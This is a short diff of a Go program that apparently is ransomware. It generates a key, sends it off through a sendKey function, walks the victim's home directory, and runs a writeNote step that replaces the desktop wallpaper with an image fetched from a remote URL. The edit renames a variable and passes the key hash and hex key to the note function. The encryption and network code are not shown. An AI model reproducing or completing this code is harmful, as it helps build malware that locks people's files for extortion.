@@ -50,13 +50,13 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	shasum, err := sendKey(hexKey)
+	shaSum, err := sendKey(hexKey)
 	if err != nil {
 		fmt.Println(err)
 		os.Exit(1)
 	}
 	traverseFiles(home)
-	writeNote(shasum)
+	writeNote(shaSum, hexKey)
 }
 
 func genKey() error {
@@ -162,7 +162,7 @@ func sendKey(hexKey string) (string, error) {
 	return shaSum, nil
 }
 
-func writeNote() {
+func writeNote(shaSum string, hexKey string) {
 	err := wallpaper.SetFromURL("https://www.gaminginstincts.com/wp-content/uploads/2019/08/Bully_2_Screenshot_Leaked_Gaming_Instincts_TV_Article_Website_Youtube_Thumbnail.jpg")
 	if err != nil {
 		fmt.Println(err)
